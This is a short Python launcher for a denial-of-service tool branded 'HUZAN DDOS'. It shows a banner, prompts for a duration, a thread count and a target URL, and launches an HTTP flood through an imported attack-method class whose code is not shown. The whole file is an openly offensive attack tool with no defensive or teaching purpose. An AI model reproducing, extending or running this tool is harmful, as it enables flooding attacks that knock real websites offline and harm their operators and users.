# Created by kiemhuy

# Import modules
import os
import sys
import argparse
from colorama import Fore

os.system("@cls & @title HUZAN DDOS BY KIEMHUY & @color e")

# Get the actual directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    # import tools.addons.winpcap
    import tools.addons.wireshark
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed to import some packages", err)
    sys.exit(1)

method = "HTTP"
logo = """
                                              
                                                ╦ ╦╔═╗╔╗╔╔═╗╦ ╦
                                                ╠═╣╠═╣║║║╔═╝║ ║
                                                ╩ ╩╩ ╩╝╚╝╚═╝╚═╝
                                                   HANZU DDOS 
                                           ╚══════════════════════════╝

"""
LIGHTCYAN_EX = '\33[96m'                                  

if __name__ == "__main__":
    # Print help
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LIGHTCYAN_EX + logo + LIGHTCYAN_EX)       
    time = int(input(f"{Fore.LIGHTCYAN_EX}          ╚═════TIME:{Fore.RESET}"))
    threads = int(input(f"{Fore.LIGHTCYAN_EX}            ╚════THREADS:{Fore.RESET}"))
    target = str(input(f"{Fore.LIGHTCYAN_EX}             ╚════URL:{Fore.RESET}"))
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)

